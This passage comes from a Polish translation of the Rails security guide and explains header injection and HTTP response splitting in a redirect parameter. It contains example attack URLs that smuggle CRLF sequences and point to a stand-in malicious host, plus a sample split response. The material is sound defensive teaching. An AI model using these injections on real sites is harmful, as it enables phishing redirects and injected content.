Wszystkie z nich są dostarczane przez użytkownika i mogą być zmodyfikowane, z
większym lub mniejszym wysiłkiem. <span style="background-color: #fffcdb;">Należy pamiętać, aby unikać
wyświetlania tych pól nagłówków</span> na przykład, kiedy wyświetlasz agenta użytkownika w sferze administracyjnej.</p></div>
<div class="paragraph"><p>Poza tym, <span style="background-color: #fffcdb;">warto wiedzieć, co robisz przy budowie nagłówków
odpowiedzi, częściowo opartych na wejściu użytkownika</span>. Na przykład jeśli
chcesz cofnąć użytkownika do określonej strony.
Mogłeś np. wprowadzić pole <tt>referer</tt> w formularzu do przekierowania na dany adres:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>redirect_to params<span style="color: #990000">[:</span>referer<span style="color: #990000">]</span></tt></pre></div></div>
<div class="paragraph"><p>Railsy w takim wypadku wstawiają ciąg znaków do <strong>pola nagłówka</strong> <tt>Location</tt> i wysyłają
status 302 (przekierowanie) do przeglądarki. Pierwszą rzeczą, którą może zrobić złośliwy użytkownik jest:</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld</tt></pre>
</div></div>
<div class="paragraph"><p>Oraz ze względu na błąd w (Ruby i) Railsach do wersji 2.1.2 (z wyjątkiem, tej właśnie wersji),
haker może wprowadzić arbitralne pola nagłówka, na przykład takie:</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld</tt></pre>
</div></div>
<div class="paragraph"><p>Zwróć uwagę, że "%0d%0a" jest zakodowaną przez URL wersją "\r\n", która
oznacza powrót-na-początek-lini i przejście-do-nowej-linii (CRLF) w języku Ruby.
Więc wynikowy nagłówek HTTP dla drugiego przykładu będzie następujący,
ponieważ drugi argument <tt>Location</tt> pole nagłówka zastępuje pierwszy.</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld</tt></pre>
</div></div>
<div class="paragraph"><p><span style="background-color: #fffcdb;">Sposoby ataku typu header injection są oparte na wstawianiu znaków
CRLF do pola nagłówka</span>. A co atakujący może zrobić z fałszywymi
przekierowaniami? Może przekierować je do strony, na której dokona phishingu.
Strona ta wygląda tak samo jak twoja, ale prosi, aby zalogować się ponownie (i
wysyła dane logowania atakującemu). Atakujący może też zainstalować złośliwe
oprogramowanie za pośrednictwem luk w przeglądarce na tej stronie.
<span style="background-color: #fffcdb;">Railsy 2.1.2 unikają wstawiania tych znaków w polu <tt>Location</tt> w
metodzie <tt>redirect_to</tt>. Upewnij się, że zrobisz to sam podczas budowania
innych pól nagłówka na podstawie danych wprowadzonych przez użytkownika</span>.</p></div>
<h4 id="_rozdzielanie_odpowiedzi">8.9.1. Rozdzielanie odpowiedzi</h4>
<div class="paragraph"><p>Jeśli atak typu Header Injection był możliwy, prawdopodobne jest, że
rozdzielanie odpowiedzi (ang. response splitting) również będzie możliwe. W
HTTP za blokiem nagłówka pojawiają się dwa ciągi  CRLF i aktualne dane (zwykle HTML). Pomysł rozdzielania odpowiedzi polega na wstawianiu dwóch CRLF w pole nagłówka, a następnie wstawianiu innej odpowiedzi ze złośliwym kodem HTML. Odpowiedź będzie wyglądała tak:</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html


HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html</tt></pre>
</div></div>
<div class="paragraph"><p>W pewnych okolicznościach złośliwy kod HTML trafi do ofiary. Jednakże, ma to
miejsce tylko i wyłącznie w przypadku połączeń typu Keep-Alive (wiele przeglądarek używa jednorazowych połączeń). Ale nie można na tym zbytnio polegać. <span style="background-color: #fffcdb;">W każdym razie jest to poważny błąd i należy zaktualizować Railsy do wersji 2.0.5 lub 2.1.2 w celu wyeliminowania ryzyka wystąpienia header injection (i tym samym rozdzielania odpowiedzi)</span>.</p></div>
</div>
<h2 id="_dodatkowe_informacje">9. Dodatkowe informacje</h2>
<div class="sectionbody">
<div class="paragraph"><p>Zakres zabezpieczeń cały czas się zmienia i ważne jest, aby być na bieżąco w
temacie, ponieważ przeoczenie nowej luki może mieć katastrofalne skutki.
Dodatkowe informacje na temat bezpieczeństwa (w Railsach) znajdziesz tutaj:</p></div>
<div class="ulist"><ul>
<li>
<p>
Projekt bezpieczeństwa w Ruby on Rails regularnie dodaje newsy: <a href="http://www.rorsecurity.info">http://www.rorsecurity.info</a>
</p>
</li>
<li>
<p>
Zapisz się do <a href="http://groups.google.com/group/rubyonrails-security">listy mailingowej</a> bezpieczeństwa w Railsach
</p>
</li>
<li>
<p>
<a href="http://secunia.com/">Bądź na bieżąco z pozostałymi warstwami aplikacji</a>
  (również posiadają cotygodniowy biuletyn)
</p>
</li>
<li>
<p>
<a href="http://ha.ckers.org/blog/">Dobry blog o bezpieczeństwie</a> zawierający <a href="http://ha.ckers.org/xss.html">ściągę z Cross-Site scripting</a>
</p>
</li>
<li>
<p>
Inny <a href="http://www.0x000000.com/">dobry blog o bezpieczeństwie</a> również zawierający ściągawki.
</p>
</li>
</ul></div>
</div>
<h2 id="_dziennik_zmian">10. Dziennik zmian</h2>
<div class="sectionbody">
<div class="paragraph"><p><a href="http://rails.lighthouseapp.com/projects/16213-rails-guides/tickets/7">Lighthouse ticket</a></p></div>
<div class="ulist"><ul>
<li>
<p>
November 1, 2008: First approved version by Heiko Webers
</p>
</li>
</ul></div>
</div>

    </div>
  </div>
</body>
</html>
